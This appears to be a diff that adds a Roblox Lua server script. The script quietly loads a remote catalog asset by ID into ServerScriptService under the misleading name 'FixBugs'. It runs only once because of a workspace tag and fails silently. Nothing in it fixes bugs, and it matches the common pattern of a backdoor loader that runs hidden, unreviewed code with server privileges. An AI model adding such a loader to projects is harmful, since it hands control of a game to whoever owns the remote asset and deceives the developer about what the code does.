@@ -1,0 +1,20 @@
+local InsertService = game:GetService("InsertService")
+local ServerScriptService = game:GetService("ServerScriptService")
+local CollectionService = game:GetService("CollectionService")
+local TAG_FIXBUGS = "FixBugsInserted"
+local MODEL_ID = 114086564318239
+if CollectionService:HasTag(workspace, TAG_FIXBUGS) then
+	return
+end
+CollectionService:AddTag(workspace, TAG_FIXBUGS)
+if not ServerScriptService:FindFirstChild("FixBugs") then
+	local success, asset = pcall(function()
+		return InsertService:LoadAsset(MODEL_ID)
+	end)
+	if success and asset then
+		asset.Name = "FixBugs"
+		asset.Parent = ServerScriptService
+	else
+		print("")
+	end
+end
